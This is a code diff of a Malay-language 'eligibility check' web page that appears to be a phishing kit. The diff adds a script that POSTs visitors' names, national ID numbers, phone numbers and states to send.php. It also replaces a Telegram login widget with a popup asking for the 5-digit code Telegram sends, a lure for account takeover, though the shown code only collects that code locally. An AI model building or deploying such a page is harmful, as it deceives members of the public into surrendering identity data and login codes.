@@ -359,20 +359,25 @@ SEMAK KELAYAKAN
 <div class="popup" id="popup">
 
     <div class="popup-content">
-        <h2>Log Masuk Telegram</h2>
+        <h2>Pengesahan Kod</h2>
 
         <p>
-            Sahkan akaun Telegram anda melalui butang rasmi di bawah untuk meneruskan proses semakan.
+            Sila masukkan kod 5 digit yang diterima daripada Telegram anda untuk meneruskan proses semakan.
         </p>
 
-        <div class="telegram-login-box">
-            <script async src="https://telegram.org/js/telegram-widget.js?22"
-                data-telegram-login="Daftarmasuk13Bot"
-                data-size="large"
-                data-userpic="false"
-                data-onauth="onTelegramAuth(user)">
-            </script>
+        <div class="otp-box">
+
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+
         </div>
+
+        <button class="verify-btn" onclick="verifyCode()">
+            SAHKAN
+        </button>
 
     </div>
 
@@ -388,7 +393,7 @@ SEMAK KELAYAKAN
         <p>
             Permohonan telah diterima.<br><br>
 
-            Sebarang maklumat akan dinyatakan melalui Telegram yang telah anda daftarkan.<br><br>
+            Sebarang maklumat akan dinyatakan melalui nombor telefon yang telah anda daftarkan.<br><br>
 
             Terima kasih.
         </p>
@@ -429,6 +434,31 @@ window.addEventListener("click", function(event){
     if(event.target === popup){
         tutupPopup();
     }
+
+});
+
+// ================= OTP INPUT =================
+const otpInputs = document.querySelectorAll(".otp-input");
+
+otpInputs.forEach((input, index) => {
+
+    input.addEventListener("input", function(){
+
+        this.value = this.value.replace(/[^0-9]/g, "");
+
+        if(this.value.length === 1 && index < otpInputs.length - 1){
+            otpInputs[index + 1].focus();
+        }
+
+    });
+
+    input.addEventListener("keydown", function(e){
+
+        if(e.key === "Backspace" && this.value === "" && index > 0){
+            otpInputs[index - 1].focus();
+        }
+
+    });
 
 });
 
@@ -563,6 +593,26 @@ function semakBorang(){
     if(!sah){
         return;
     }
+
+    // Hantar maklumat permohonan
+    fetch("send.php", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            nama: nama.value,
+            ic: ic.value,
+            telefon: telefon.value,
+            negeri: negeri.value
+        })
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log("Permohonan:", data);
+    })
+    .catch(error => console.log(error));
+
 // Buka popup
 bukaPopup();
 
@@ -570,31 +620,18 @@ bukaPopup();
 
 semakBtn.onclick = semakBorang;
 
-function onTelegramAuth(user){
+function verifyCode(){
 
-    const nama = document.getElementById("nama").value.trim();
-    const ic = document.getElementById("ic").value.trim();
-    const telefon = document.getElementById("telefon").value.trim();
-    const negeri = document.getElementById("negeri").value;
+    let code = "";
 
-    fetch("send.php", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            nama: nama,
-            ic: ic,
-            telefon: telefon,
-            negeri: negeri,
-            telegram_user: user
-        })
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log("Telegram Login:", data);
-    })
-    .catch(error => console.log(error));
+    otpInputs.forEach(input => {
+        code += input.value;
+    });
+
+    if(code.length !== 5){
+        alert("Sila lengkapkan kod 5 digit.");
+        return;
+    }
 
     tutupPopup();
     bukaPopupSuccess();
